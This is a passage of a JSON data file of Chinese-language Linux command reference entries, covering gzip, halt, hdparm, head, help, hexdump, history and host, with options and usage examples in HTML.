class=\"hljs-deletion\">--best：此参数的效果和指定“-9”参数相同；</span>\n<span class=\"hljs-deletion\">--fast：此参数的效果和指定“-1”参数相同。</span>\n<span class=\"hljs-deletion\">-num 用指定的数字num调整压缩的速度，-1或--fast表示最快压缩方法（低压缩比），-9或--best表示最慢压缩方法（高压缩比）。系统缺省值为6。</span>\n<span class=\"hljs-deletion\">-c或--stdout或--to-stdout：保留原始文件，生成标准输出流（结合重定向使用）。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件列表：指定要压缩的文件列表。</p>\n<h3 id=\"实例\">实例</h3>\n<p>把test6目录下的每个文件压缩成.gz文件</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">gzip</span> *\n</code></pre>\n<p>把上例中每个压缩的文件解压，并列出详细的信息</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">gzip</span> -dv *\n</code></pre>\n<p>详细显示例1中每个压缩的文件的信息，并不解压</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">gzip</span> -l *\n</code></pre>\n<p>压缩一个tar备份文件，此时压缩文件的扩展名为.tar.gz</p>\n<pre><code class=\"language-shell\">gzip -r <span class=\"hljs-built_in\">log</span>.tar\n</code></pre>\n<p>递归的压缩目录</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">gzip</span> -rv test6\n</code></pre>\n<p>这样，所有test下面的文件都变成了*.gz，目录依然存在只是目录里面的文件相应变成了*.gz.这就是压缩，和打包不同。因为是对目录操作，所以需要加上-r选项，这样也可以对子目录进行递归了。</p>\n<p>递归地解压目录</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">gzip</span> -dr test6\n</code></pre>\n<p>保留原始文件，把压缩/解压流重定向到新文件</p>\n<pre><code class=\"language-shell\">gzip -c aa &gt; aa<span class=\"hljs-selector-class\">.gz</span>\ngzip -dc bb<span class=\"hljs-selector-class\">.gz</span> &gt; bb\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "halt",
        "des": "关闭正在运行的Linux操作系统",
        "body": "<h1 id=\"halt\">halt</h1>\n<p>关闭正在运行的Linux操作系统</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>halt命令</strong> 用来关闭正在运行的Linux操作系统。halt命令会先检测系统的runlevel，若runlevel为0或6，则关闭系统，否则即调用shutdown来关闭系统。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">halt</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：不要在wtmp中记录；</span>\n<span class=\"hljs-deletion\">-f：不论目前的runlevel为何，不调用shutdown即强制关闭系统；</span>\n<span class=\"hljs-deletion\">-i：在halt之前，关闭全部的网络界面；</span>\n<span class=\"hljs-deletion\">-n：halt前，不用先执行sync；</span>\n<span class=\"hljs-deletion\">-p：halt之后，执行poweroff；</span>\n<span class=\"hljs-deletion\">-w：仅在wtmp中记录，而不实际结束系统。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">halt</span> -p     <span class=\"hljs-comment\"># 关闭系统后关闭电源。</span>\nhalt -d     <span class=\"hljs-comment\"># 关闭系统，但不留下纪录。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "hdparm",
        "des": "显示与设定硬盘的参数",
        "body": "<h1 id=\"hdparm\">hdparm</h1>\n<p>显示与设定硬盘的参数</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>hdparm命令</strong> 提供了一个命令行的接口用于读取和设置IDE或SCSI硬盘参数。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">hdparm</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a&lt;快取分区&gt;：设定读取文件时，预先存入块区的分区数，若不加上&lt;快取分区&gt;选项，则显示目前的设定；</span>\n<span class=\"hljs-deletion\">-A&lt;0或1&gt;：启动或关闭读取文件时的快取功能；</span>\n<span class=\"hljs-deletion\">-c&lt;I/O模式&gt;：设定IDE32位I/O模式；</span>\n<span class=\"hljs-deletion\">-C：检测IDE硬盘的电源管理模式；</span>\n<span class=\"hljs-deletion\">-d&lt;0或1&gt;：设定磁盘的DMA模式；</span>\n<span class=\"hljs-deletion\">-f：将内存缓冲区的数据写入硬盘，并清楚缓冲区；</span>\n<span class=\"hljs-deletion\">-g：显示硬盘的磁轨，磁头，磁区等参数；</span>\n<span class=\"hljs-deletion\">-h：显示帮助；</span>\n<span class=\"hljs-deletion\">-i：显示硬盘的硬件规格信息，这些信息是在开机时由硬盘本身所提供；</span>\n<span class=\"hljs-deletion\">-I：直接读取硬盘所提供的硬件规格信息；</span>\n<span class=\"hljs-deletion\">-k&lt;0或1&gt;：重设硬盘时，保留-dmu参数的设定；</span>\n<span class=\"hljs-deletion\">-K&lt;0或1&gt;：重设硬盘时，保留-APSWXZ参数的设定；</span>\n<span class=\"hljs-deletion\">-m&lt;磁区数&gt;：设定硬盘多重分区存取的分区数；</span>\n<span class=\"hljs-deletion\">-n&lt;0或1&gt;：忽略硬盘写入时所发生的错误；</span>\n<span class=\"hljs-deletion\">-p&lt;PIO模式&gt;：设定硬盘的PIO模式；</span>\n<span class=\"hljs-deletion\">-P&lt;磁区数&gt;：设定硬盘内部快取的分区数；</span>\n<span class=\"hljs-deletion\">-q:在执行后续的参数时，不在屏幕上显示任何信息；</span>\n<span class=\"hljs-deletion\">-r&lt;0或1&gt;:设定硬盘的读写模式；</span>\n<span class=\"hljs-deletion\">-S&lt;时间&gt;:设定硬盘进入省电模式前的等待时间；</span>\n<span class=\"hljs-deletion\">-t;评估硬盘的读取效率；</span>\n<span class=\"hljs-deletion\">-T：平谷硬盘快取的读取效率；</span>\n<span class=\"hljs-deletion\">-u&lt;0或1&gt;：在硬盘存取时，允许其他中断要求同时执行；</span>\n<span class=\"hljs-deletion\">-v：显示硬盘的相关设定；</span>\n<span class=\"hljs-deletion\">-w&lt;0或1&gt;：设定硬盘的写入快取；</span>\n<span class=\"hljs-deletion\">-X&lt;传输模式&gt;：设定硬盘的传输模式；</span>\n<span class=\"hljs-deletion\">-y：使IDE硬盘进入省电模式；</span>\n<span class=\"hljs-deletion\">-Y：使IDE硬盘进入睡眠模式；</span>\n<span class=\"hljs-deletion\">-Z：关闭某些Seagate硬盘的自动省电功能。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>设备文件：指定id驱动对应的设备文件名。</p>\n<h3 id=\"实例\">实例</h3>\n<p>显示硬盘的相关设置：</p>\n<pre><code class=\"language-shell\">hdparm <span class=\"hljs-regexp\">/dev/</span>sda\n<span class=\"hljs-regexp\">/dev/</span>sda:\nIO_support = <span class=\"hljs-number\">0</span> (<span class=\"hljs-keyword\">default</span> <span class=\"hljs-number\">16</span>-bit)\nreadonly = <span class=\"hljs-number\">0</span> (off)\nreadahead = <span class=\"hljs-number\">256</span> (on)\ngeometry = <span class=\"hljs-number\">19457</span>［柱面数］<span class=\"hljs-regexp\">/255［磁头数］/</span><span class=\"hljs-number\">63</span>［扇区数］, sectors = <span class=\"hljs-number\">312581808</span>［总扇区数］, start = <span class=\"hljs-number\">0</span>［起始扇区数］\n\n```shell\n\n显示硬盘的柱面、磁头、扇区数：\n\n```shell\nhdparm -g <span class=\"hljs-regexp\">/dev/</span>sda\n<span class=\"hljs-regexp\">/dev/</span>sda:\ngeometry = <span class=\"hljs-number\">19457</span>［柱面数］<span class=\"hljs-regexp\">/255［磁头数］/</span><span class=\"hljs-number\">63</span>［扇区数］, sectors = <span class=\"hljs-number\">312581808</span>［总扇区数］, start = <span class=\"hljs-number\">0</span>［起始扇区数］\n</code></pre>\n<p>测试硬盘的读取速度：</p>\n<pre><code class=\"language-shell\">hdparm -T <span class=\"hljs-regexp\">/dev/</span>sda\n<span class=\"hljs-regexp\">/dev/</span>sda:\n Timing cached reads:   <span class=\"hljs-number\">4684</span> MB <span class=\"hljs-keyword\">in</span>  <span class=\"hljs-number\">2.00</span> seconds = <span class=\"hljs-number\">2342.92</span> MB/sec\n</code></pre>\n<p>测试硬盘缓存的读取速度：</p>\n<pre><code class=\"language-shell\">hdparm -T <span class=\"hljs-regexp\">/dev/</span>xvda\n<span class=\"hljs-regexp\">/dev/</span>xvda:\nTiming cached reads: <span class=\"hljs-number\">11154</span> MB <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">1.98</span> seconds = <span class=\"hljs-number\">5633.44</span> MB/sec\n</code></pre>\n<p>检测硬盘的电源管理模式：</p>\n<pre><code class=\"language-shell\">hdparm -C /dev/sda\n/dev/sda:\ndrive <span class=\"hljs-keyword\">state</span> is: standby [省电模式]\n</code></pre>\n<p>查询并设置硬盘多重扇区存取的扇区数，以增进硬盘的存取效率：</p>\n<pre><code class=\"language-shell\">hdparm -m <span class=\"hljs-regexp\">/dev/</span>sda\nhdparm -m    #参数值为整数值如<span class=\"hljs-number\">8</span> <span class=\"hljs-regexp\">/dev/</span>sda\n</code></pre>\n<p> <strong>附：硬盘坏道修复方法</strong> </p>\n<pre><code class=\"language-shell\">检查：smartctl -l selftest <span class=\"hljs-regexp\">/dev/</span>sda\n卸载：umount <span class=\"hljs-regexp\">/dev/</span>sda*\n修复：badblocks <span class=\"hljs-regexp\">/dev/</span>sda\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "head",
        "des": "显示文件的开头部分。",
        "body": "<h1 id=\"head\">head</h1>\n<p>显示文件的开头部分。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">head [<span class=\"hljs-symbol\">OPTION</span>]... [<span class=\"hljs-symbol\">FILE</span>]...\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>在未指定行数时默认显示前10行。</li>\n<li>处理多个文件时会在各个文件之前附加含有文件名的行。</li>\n<li>当没有文件或文件为<code>-</code>时，读取标准输入。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\">-c, --bytes=[-]NUM       显示前NUM字节；如果NUM前有<span class=\"hljs-string\">\"-\"</span>，那么会打印除了文件末尾的NUM字节以外的其他内容。\n-n, --lines=[-]NUM       显示前NUM行而不是默认的10行；如果NUM前有<span class=\"hljs-string\">\"-\"</span>，那么会打印除了文件末尾的NUM行以外的其他行。\n-q, --quiet, --silent    不打印文件名行。\n-v, --verbose            总是打印文件名行。\n-z, --zero-terminated    行终止符为NUL而不是换行符。\n--help                   显示帮助信息并退出。\n--version                显示版本信息并退出。\n\nNUM可以有一个乘数后缀：\nb 512\nkB 1000\nk 1024\nMB 1000<span class=\"hljs-number\">*1000</span>\nM 1024<span class=\"hljs-number\">*1024</span>\nGB 1000<span class=\"hljs-number\">*1000</span><span class=\"hljs-number\">*1000</span>\nG 1024<span class=\"hljs-number\">*1024</span><span class=\"hljs-number\">*1024</span>\nT、P、E、Z、Y等以此类推。\n\n也可以使用二进制前缀：\n<span class=\"hljs-attribute\">KiB</span>=K\n<span class=\"hljs-attribute\">MiB</span>=M\n以此类推。\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>FILE（可选）：要处理的文件，可以为一或多个。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回0表示成功，返回非0值表示失败。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 查看历史文件的前6行：</span>\n[user2@pc ~]$ head -n 6 ~<span class=\"hljs-string\">/.bash_history</span>\n<span class=\"hljs-comment\">#1575425555</span>\n<span class=\"hljs-keyword\">cd</span> ~\n<span class=\"hljs-comment\">#1575425558</span>\n<span class=\"hljs-keyword\">ls</span> -lh\n<span class=\"hljs-comment\">#1575425562</span>\nvi ~<span class=\"hljs-string\">/Desktop/ZhuangZhu-74.txt</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 查看多个文件：</span>\n[user2@pc ~]$ head -n ~<span class=\"hljs-regexp\">/.bash_history ~/</span>.bashrc\n==&gt; <span class=\"hljs-regexp\">/allhome/u</span>ser2/.bash_history &lt;==\n<span class=\"hljs-comment\">#1575425555</span>\ncd ~\n<span class=\"hljs-comment\">#1575425558</span>\nls -lh\n<span class=\"hljs-comment\">#1575425562</span>\nvi ~<span class=\"hljs-regexp\">/Desktop/</span>ZhuangZhu-<span class=\"hljs-number\">74</span>.txt\n<span class=\"hljs-comment\">#1575425566</span>\nuptime\n<span class=\"hljs-comment\">#1575425570</span>\nfind ~/ -maxdepth <span class=\"hljs-number\">3</span> -name <span class=\"hljs-string\">'test.sh'</span> -exec lh {} \\;\n\n==&gt; <span class=\"hljs-regexp\">/allhome/u</span>ser2/.bashrc &lt;==\n<span class=\"hljs-comment\"># .bashrc</span>\n\n<span class=\"hljs-comment\"># forbid use Ctrl+D to exit shell.</span>\nset -o ignoreeof\n\n<span class=\"hljs-comment\"># Source global definitions.</span>\n<span class=\"hljs-keyword\">if</span> [ -f <span class=\"hljs-regexp\">/etc/</span>bashrc ]; then\n        . <span class=\"hljs-regexp\">/etc/</span>bashrc\nfi\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 head</code>，<code>info coreutils 'head invocation'</code>。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "help",
        "des": "该命令是bash内建命令，用于显示bash内建命令的帮助信息。",
        "body": "<h1 id=\"help\">help</h1>\n<p>该命令是bash内建命令，用于显示bash内建命令的帮助信息。</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>help命令</strong> help命令只能显示bash内建命令的帮助信息，而对于外部命令的帮助信息只能使用man或者info命令查看。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">help</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：显示内建命令的简要描述。</span>\n<span class=\"hljs-deletion\">-m：按照man手册的格式输出内建命令的帮助信息。</span>\n<span class=\"hljs-deletion\">-s：仅输出内建命令的命令格式。</span>\n不指定选项时：输出的帮助信息类似于-m选项，但是缺少段落名称和'SEE ALSO'，'IMPLEMENTATION'部分。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>bash内建命令（可以为多个，请用空格分隔开）。</p>\n<h3 id=\"常见问题\">常见问题</h3>\n<p>Q：有哪些命令是bash内建命令？我如何判断一个命令是否为bash内建命令？</p>\n<p>A：您可以在终端使用 'man builtin' 或 'man builtins' 来获取；您可以查看bash内建命令 'type' 的帮助信息。</p>\n<p>Q：那么help命令本身的帮助信息如何获取？</p>\n<p>A：把help作为参数传给help命令；）</p>\n<p>Q：为什么echo也可以用 'man echo' 来查看帮助信息？</p>\n<p>A：因为除了bash内建的echo，GNU/linux的coreutils包里也有该命令；在echo的man手册中，DESCRIPTION段落的 'NOTE' 也提示了和同名内建的不同。</p>\n<p>PS：当你在shell脚本里定义了一个叫 'echo' 的函数，那么调用的时候优先级会如何呢？</p>\n<p>请参考 'builtin' 命令</p>\n<p>Q：我需要获得更多的bash的相关帮助信息</p>\n<p>A：限于篇幅和主题，您可以在终端执行 'man bash' ， 'info bash' ，<a href=\"http://www.gnu.org/software/bash/\">访问bash官方网站</a>，以及搜索引擎等。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用help命令显示shell内部shopt命令的帮助信息，输入如下命令：</p>\n<pre><code class=\"language-shell\">help shopt                #获取shopt命令的帮助信息\n<span class=\"hljs-symbol\">shopt:</span> shopt [-pqsu] [-o <span class=\"hljs-type\">long</span>-<span class=\"hljs-keyword\">option</span>] optname [optname...]\n    Toggle the values <span class=\"hljs-keyword\">of</span> variables controlling <span class=\"hljs-keyword\">optional</span> behavior.\n    The -s flag means <span class=\"hljs-keyword\">to</span> enable (<span class=\"hljs-keyword\">set</span>) <span class=\"hljs-keyword\">each</span> OPTNAME; the -u flag\n    unsets <span class=\"hljs-keyword\">each</span> OPTNAME.  The -q flag suppresses output; the <span class=\"hljs-keyword\">exit</span>\n    status indicates whether <span class=\"hljs-keyword\">each</span> OPTNAME <span class=\"hljs-built_in\">is</span> <span class=\"hljs-keyword\">set</span> <span class=\"hljs-built_in\">or</span> unset.  The -o\n    <span class=\"hljs-keyword\">option</span> restricts the OPTNAMEs <span class=\"hljs-keyword\">to</span> those defined <span class=\"hljs-keyword\">for</span> use <span class=\"hljs-keyword\">with</span>\n    `<span class=\"hljs-keyword\">set</span> -o<span class=\"hljs-comment\">'.  With no options, or with the -p option, a list of all</span>\n    settable options <span class=\"hljs-built_in\">is</span> displayed, <span class=\"hljs-keyword\">with</span> an indication <span class=\"hljs-keyword\">of</span> whether <span class=\"hljs-built_in\">or</span>\n    <span class=\"hljs-built_in\">not</span> <span class=\"hljs-keyword\">each</span> <span class=\"hljs-built_in\">is</span> <span class=\"hljs-keyword\">set</span>.\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "hexdump",
        "des": "显示文件十六进制格式",
        "body": "<h1 id=\"hexdump\">hexdump</h1>\n<p>显示文件十六进制格式</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>hexdump命令</strong> 一般用来查看“二进制”文件的十六进制编码，但实际上它能查看任何文件，而不只限于二进制文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">hexdump [选项] [文件]...\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-n length 只格式化输入文件的前length个字节。</span>\n<span class=\"hljs-deletion\">-C 输出规范的十六进制和ASCII码。</span>\n<span class=\"hljs-deletion\">-b 单字节八进制显示。</span>\n<span class=\"hljs-deletion\">-c 单字节字符显示。</span>\n<span class=\"hljs-deletion\">-d 双字节十进制显示。</span>\n<span class=\"hljs-deletion\">-o 双字节八进制显示。</span>\n<span class=\"hljs-deletion\">-x 双字节十六进制显示。</span>\n<span class=\"hljs-deletion\">-s 从偏移量开始输出。</span>\n<span class=\"hljs-deletion\">-e 指定格式字符串，格式字符串包含在一对单引号中，格式字符串形如：'a/b \"format1\" \"format2\"'。</span>\n</code></pre>\n<p>每个格式字符串由三部分组成，每个由空格分隔，第一个形如a/b，b表示对每b个输入字节应用format1格式，a表示对每a个输入字节应用format2格式，一般a&gt;b，且b只能为1，2，4，另外a可以省略，省略则a=1。format1和format2中可以使用类似printf的格式字符串，如：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">02d</span></span>：两位十进制\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">03x</span></span>：三位十六进制\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">02o</span></span>：两位八进制\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">c</span></span>：单个字符等\n</code></pre>\n<p>还有一些特殊的用法：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">_ad</span></span>：标记下一个输出字节的序号，用十进制表示。\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">_ax</span></span>：标记下一个输出字节的序号，用十六进制表示。\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">_ao</span></span>：标记下一个输出字节的序号，用八进制表示。\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">_p</span></span>：对不能以常规字符显示的用 . 代替。\n</code></pre>\n<p>同一行如果要显示多个格式字符串，则可以跟多个<code>-e</code>选项。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">hexdump</span> -e '<span class=\"hljs-number\">16</span>/<span class=\"hljs-number\">1</span> <span class=\"hljs-string\">\"%02X \"</span> <span class=\"hljs-string\">\"  |  \"</span>' -e '<span class=\"hljs-number\">16</span>/<span class=\"hljs-number\">1</span> <span class=\"hljs-string\">\"%_p\"</span> <span class=\"hljs-string\">\"\\n\"</span>' test\n<span class=\"hljs-attribute\">00</span> <span class=\"hljs-number\">01</span> <span class=\"hljs-number\">02</span> <span class=\"hljs-number\">03</span> <span class=\"hljs-number\">04</span> <span class=\"hljs-number\">05</span> <span class=\"hljs-number\">06</span> <span class=\"hljs-number\">07</span> <span class=\"hljs-number\">08</span> <span class=\"hljs-number\">09</span> <span class=\"hljs-number\">0</span>A <span class=\"hljs-number\">0</span>B <span class=\"hljs-number\">0</span>C <span class=\"hljs-number\">0</span>D <span class=\"hljs-number\">0</span>E <span class=\"hljs-number\">0</span>F  |  ................  \n<span class=\"hljs-attribute\">10</span> <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">12</span> <span class=\"hljs-number\">13</span> <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">16</span> <span class=\"hljs-number\">17</span> <span class=\"hljs-number\">18</span> <span class=\"hljs-number\">19</span> <span class=\"hljs-number\">1</span>A <span class=\"hljs-number\">1</span>B <span class=\"hljs-number\">1</span>C <span class=\"hljs-number\">1</span>D <span class=\"hljs-number\">1</span>E <span class=\"hljs-number\">1</span>F  |  ................  \n<span class=\"hljs-attribute\">20</span> <span class=\"hljs-number\">21</span> <span class=\"hljs-number\">22</span> <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">24</span> <span class=\"hljs-number\">25</span> <span class=\"hljs-number\">26</span> <span class=\"hljs-number\">27</span> <span class=\"hljs-number\">28</span> <span class=\"hljs-number\">29</span> <span class=\"hljs-number\">2</span>A <span class=\"hljs-number\">2</span>B <span class=\"hljs-number\">2</span>C <span class=\"hljs-number\">2</span>D <span class=\"hljs-number\">2</span>E <span class=\"hljs-number\">2</span>F  |   !<span class=\"hljs-string\">\"#$%&amp;'()*+,-./ </span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "history",
        "des": "显示或操作历史列表。",
        "body": "<h1 id=\"history\">history</h1>\n<p>显示或操作历史列表。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">history <span class=\"hljs-selector-attr\">[-c]</span> <span class=\"hljs-selector-attr\">[-d offset]</span> <span class=\"hljs-selector-attr\">[n]</span>\nhistory -anrw <span class=\"hljs-selector-attr\">[filename]</span>\nhistory -ps arg <span class=\"hljs-selector-attr\">[arg...]</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li><p>显示历史列表。</p>\n</li>\n<li><p>操作历史列表。</p>\n</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c           清空历史列表。</span>\n<span class=\"hljs-deletion\">-d offset    根据offset删除记录。如果是正数则表示offset位置的记录，如果为负数则表示从结尾向前offset位置的记录。</span>\n<span class=\"hljs-deletion\">-a           将当前终端的历史记录行添加到历史记录文件。</span>\n<span class=\"hljs-deletion\">-n           将尚未从历史文件中读取的历史行追加到当前历史列表中。</span>\n<span class=\"hljs-deletion\">-r           读取历史文件，并将其内容附加到历史列表中。</span>\n<span class=\"hljs-deletion\">-w           将当前历史记录列表附加到历史记录文件中并且附加它们到历史列表中。</span>\n<span class=\"hljs-deletion\">-p           在每个arg上执行历史记录扩展并在标准输出上显示结果，而不将结果存储在历史记录列表中。</span>\n<span class=\"hljs-deletion\">-s           将每个arg作为单个条目附加到历史记录列表。</span>\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>n：可选，只列出最近的n条记录。</p>\n<p>filename：可选，表示历史文件；默认调用顺序为<code>filename</code>、环境变量<code>HISTFILE</code>、<code>~/.bash_history</code>。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回成功，除非提供了非法选项或出现了错误。</p>\n<h2 id=\"例子\">例子</h2>\n<p>使用history命令显示最近使用的10条历史命令</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># history 10</span>\n   <span class=\"hljs-number\">92</span>  ls\n   <span class=\"hljs-number\">93</span>  cd ..\n   <span class=\"hljs-number\">94</span>  ls\n   <span class=\"hljs-number\">95</span>  <span class=\"hljs-keyword\">exit</span>\n   <span class=\"hljs-number\">96</span>  ls -a\n   <span class=\"hljs-number\">97</span>  cd .ssh/\n   <span class=\"hljs-number\">98</span>  ls\n   <span class=\"hljs-number\">99</span>  cat known_hosts\n  <span class=\"hljs-number\">100</span>  <span class=\"hljs-keyword\">exit</span>\n  <span class=\"hljs-number\">101</span>  history <span class=\"hljs-number\">10</span>\n</code></pre>\n<p>清空历史记录</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># history -c</span>\n</code></pre>\n<p>更多实例:</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># 执行第 n 条历史命令</span>\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># !n</span>\n\n<span class=\"hljs-meta\"># 执行最后一条 xxx 开头的命令</span>\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># !xxx</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>在命令行中，可以使用符号<code>!</code>执行指定序号的历史命令。例如，要执行第2个历史命令，则输入<code>!2</code>。</li>\n<li>关闭终端后，历史列表将被写入历史文件<code>~/.bash_history</code>。</li>\n<li>环境变量<code>HISTSIZE</code>决定了历史文件中命令的存储数量，默认存储1000条。</li>\n<li>环境变量<code>HISTTIMEFORMAT</code>如果是非空值，则使用其值作为<code>strftime(3)</code>打印相关时间戳的格式字符串添加在每个显示的历史记录之前；否则不会打印时间戳。</li>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "host",
        "des": "常用的分析域名查询工具",
        "body": "<h1 id=\"host\">host</h1>\n<p>常用的分析域名查询工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>host命令</strong> 是常用的分析域名查询工具，可以用来测试域名系统工作是否正常。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">host</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：显示详细的DNS信息；</span>\n<span class=\"hljs-deletion\">-c&lt;类型&gt;：指定查询类型，默认值为“IN“；</span>\n<span class=\"hljs-deletion\">-C：查询指定主机的完整的SOA记录；</span>\n<span class=\"hljs-deletion\">-r：在查询域名时，不使用递归的查询方式；</span>\n<span class=\"hljs-deletion\">-t&lt;类型&gt;：指定查询的域名信息类型；</span>\n<span class=\"hljs-deletion\">-v：显示指令执行的详细信息；</span>\n<span class=\"hljs-deletion\">-w：如果域名服务器没有给出应答信息，则总是等待，直到域名服务器给出应答；</span>\n<span class=\"hljs-deletion\">-W&lt;时间&gt;：指定域名查询的最长时间，如果在指定时间内域名服务器没有给出应答信息，则退出指令；</span>\n<span class=\"hljs-deletion\">-4：使用IPv4；</span>\n<span class=\"hljs-deletion\">-6：使用IPv6.</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>主机：指定要查询信息的主机信息。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># host www.jsdig.com </span>\nwww.<span class=\"hljs-keyword\">jsdig.com </span>is an alias for host.<span class=\"hljs-number\">1</span>.<span class=\"hljs-keyword\">jsdig.com.\n</span>host.<span class=\"hljs-number\">1</span>.<span class=\"hljs-keyword\">jsdig.com </span>has <span class=\"hljs-keyword\">address </span><span class=\"hljs-number\">100</span>.<span class=\"hljs-number\">42</span>.<span class=\"hljs-number\">212</span>.<span class=\"hljs-number\">8</span>\n\n[root@localhost ~]<span class=\"hljs-comment\"># host -a www.jsdig.com</span>\nTrying <span class=\"hljs-string\">\"www.jsdig.com\"</span>\n<span class=\"hljs-comment\">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 34671</span>\n<span class=\"hljs-comment\">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0</span>\n\n<span class=\"hljs-comment\">;; QUESTION SECTION:</span>\n<span class=\"hljs-comment\">;www.jsdig.com.               IN      ANY</span>\n\n<span class=\"hljs-comment\">;; ANSWER SECTION:</span>\nwww.<span class=\"hljs-keyword\">jsdig.com. </span>       <span class=\"hljs-number\">463</span>     IN      CNAME   host.<span class=\"hljs-number\">1</span>.<span class=\"hljs-keyword\">jsdig.com.\n</span>\nReceived <span class=\"hljs-number\">54</span> <span class=\"hljs-keyword\">bytes </span>from <span class=\"hljs-number\">202</span>.<span class=\"hljs-number\">96</span>.<span 